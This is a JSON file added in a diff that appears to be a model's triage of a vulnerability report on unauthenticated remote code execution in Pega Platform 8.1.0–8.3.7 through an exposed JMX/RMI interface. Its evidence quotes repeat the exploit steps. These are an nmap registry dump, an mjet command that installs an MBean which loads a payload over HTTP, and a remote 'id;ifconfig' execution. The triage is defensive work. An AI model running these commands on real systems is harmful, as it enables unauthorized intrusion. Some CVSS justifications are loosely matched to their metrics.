@@ -1,0 +1,73 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "The report describes an unauthenticated remote code execution (RCE) against Pega Platform (on-premise) 8.1.0 through 8.3.7 via an exposed Java RMI/JMX interface using the MOGWAI LABS JMX Exploitation Toolkit to install an MBean and execute commands.",
+    "affected_product": "Pega Platform on-premise 8.1.0 up to 8.3.7",
+    "cwe": "CWE-94",
+    "cwe_quote": "Installing mbean for remote code execution",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "Exploitation requires: - JVM - MOGWAI LABS JMX Exploitation Toolkit (https://github.com/mogwailabs/mjet) - jython"
+      },
+      "AC": {
+        "value": "L",
+        "quote": "Exploitation requires: - JVM - MOGWAI LABS JMX Exploitation Toolkit (https://github.com/mogwailabs/mjet) - jython"
+      },
+      "PR": {
+        "value": "N",
+        "quote": ";Dumping RMI registry:\nnmap -sT -sV --script rmi-dumpregistry -p 9999 <IP Address>"
+      },
+      "UI": {
+        "value": "N",
+        "quote": "java -jar jython-standalone-2.7.2.jar mjet.py --localhost_bypass <PORT> <IP\nAddress> 9999 install random_password http://<Local IP to Serve Payload\nover HTTP>:6666 6666"
+      },
+      "S": {
+        "value": "U",
+        "quote": "Execution of commands id & ifconfig\njava -jar jython-standalone-2.7.2.jar mjet.py --localhost_bypass <PORT> <IP\nAddress> 9999 command random_password \"id;ifconfig\""
+      },
+      "C": {
+        "value": "H",
+        "quote": "Execution of commands id & ifconfig\njava -jar jython-standalone-2.7.2.jar mjet.py --localhost_bypass <PORT> <IP\nAddress> 9999 command random_password \"id;ifconfig\""
+      },
+      "I": {
+        "value": "H",
+        "quote": "Execution of commands id & ifconfig\njava -jar jython-standalone-2.7.2.jar mjet.py --localhost_bypass <PORT> <IP\nAddress> 9999 command random_password \"id;ifconfig\""
+      },
+      "A": {
+        "value": "H",
+        "quote": "Execution of commands id & ifconfig\njava -jar jython-standalone-2.7.2.jar mjet.py --localhost_bypass <PORT> <IP\nAddress> 9999 command random_password \"id;ifconfig\""
+      }
+    },
+    "recommended_next_step": "Verify presence of an exposed RMI/JMX service on the reported hosts and attempt the described RMI registry enumeration and controlled reproduction in a lab to confirm impact; if confirmed, isolate affected hosts and apply vendor mitigations or disable unauthenticated JMX/RMI access.",
+    "confidence": "high",
+    "evidence_quotes": [
+      {
+        "claim": "Affected versions",
+        "quote": "Version: 8.1.0 on-premise and higher, up to 8.3.7"
+      },
+      {
+        "claim": "RMI registry enumeration command",
+        "quote": ";Dumping RMI registry:\nnmap -sT -sV --script rmi-dumpregistry -p 9999 <IP Address> "
+      },
+      {
+        "claim": "Exploit requires tools",
+        "quote": "Exploitation requires:\n;- JVM\n;- MOGWAI LABS JMX Exploitation Toolkit (https://github.com/mogwailabs/mjet)\n;- jython"
+      },
+      {
+        "claim": "Install MBean for RCE",
+        "quote": "Installing mbean for remote code execution"
+      },
+      {
+        "claim": "Command execution example",
+        "quote": "Execution of commands id & ifconfig\njava -jar jython-standalone-2.7.2.jar mjet.py --localhost_bypass <PORT> <IP\nAddress> 9999 command random_password \"id;ifconfig\""
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 2042,
+    "output_tokens": 844,
+    "latency_s": null,
+    "batch": true
+  }
+}
